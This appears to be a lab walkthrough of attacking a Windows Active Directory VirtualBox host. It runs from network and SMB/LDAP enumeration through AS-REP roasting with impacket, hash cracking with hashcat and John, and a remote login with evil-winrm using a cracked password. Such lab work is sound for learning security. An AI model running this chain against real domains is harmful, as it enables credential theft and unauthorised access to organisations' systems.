# SMB and Network Scanning Instructions

## 1) Install `arp-scan`
`arp-scan` sends ARP requests to all IP addresses on a local network.

```bash
sudo apt update
sudo apt install arp-scan
```

## 2) Run the Provided Script
The script runs a simple one-liner to scan each network adapter to check for an IP.

If the script can't be executed, change the permissions:

```bash
chmod +x arp-scan.sh
```

## 3) Run `nmap` on Returned IP Addresses
`nmap` is a network exploration and security/port scanning tool.

```bash
nmap -sV -sC -vv -p- -Pn <IP>
```

- `-sV`: Probe open ports to determine service/version info
- `-sC`: Run default scripts to check for common vulnerabilities
- `-vv`: Increase verbosity for detailed info
- `-p-`: Scan all 65535 TCP ports

### What Did I Learn?
- Open ports like 53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/3268 (LDAP)
- HTTPAPI on 5985, 47001; .NET Message Framing on 9389
- RPC activity indicates administrative functions
- SMB signing is enabled
- Host runs in Oracle VirtualBox
- Appears to be a Windows server in an Active Directory domain

## 4) Use `smbmap` to Enumerate SMB Shares

```bash
smbmap -H 192.168.56.107
```

## 5) Use `enum4linux-ng` for SMB/NetBIOS Enumeration

```bash
enum4linux-ng 192.168.56.107
```

## 6) Use `crackmapexec` to Enumerate SMB Info

```bash
crackmapexec smb 192.168.56.107
```

## 7) Evaluation of Scan Tools
The most useful tools:
- **Nmap**: Gave version info, open ports, domain data
- **Enum4linux-ng**: Confirmed domain name, Windows version, and SMB protocols

Most detailed info was denied due to permission restrictions. LDAP and MSRPC can be used to pull more data.

## 8) Test with `smbclient`

```bash
smbclient -L 192.168.56.107 -U ""
```

Anonymous login currently grants access. This should be disabled for better security.

## 9) Try `rpcclient`

```bash
rpcclient -N -U '' 192.168.56.107
```

Run `enumdomusers` — might get permission denied, but can still retrieve user data.

## 10) LDAP Enumeration

To get base naming context:

```bash
ldapsearch -H ldap://192.168.56.107 -x -s base namingcontext
```

To search for users:

```bash
ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org" '(objectClass=User)' "sAMAccountName" | grep "sAMAccountName"
```

## 11) Use Impacket and Hashcat

```bash
impacket-GetNPUsers -dc-ip 192.168.56.107 -request 'skypia.org/'
```

Then:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hashcat hash-jemmie.txt /usr/share/wordlists/rockyou.txt
```

Alternatively, use John the Ripper:

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt poskus1.txt
```

## 12) Use `rpcclient` with Found Credentials

```bash
rpcclient -U "jemmie.blondell" 192.168.56.107
```

More users may now be visible.

## 13) Access Target with `evil-winrm`

```bash
evil-winrm -i 192.168.56.107 -u jemmie.blondell -p winter
```

Check the target system after login.

## 14) Check Permissions via `smbmap`

```bash
smbmap -H 192.168.56.107 -u "jemmie.blondell" -p winter
```

Explore accessible directories and check for higher privileged users.

## 15) Connect with `smbclient`

```bash
smbclient //192.168.56.107/ -U "jemmie.blondell"
```

Use it to access specific shares with valid credentials.
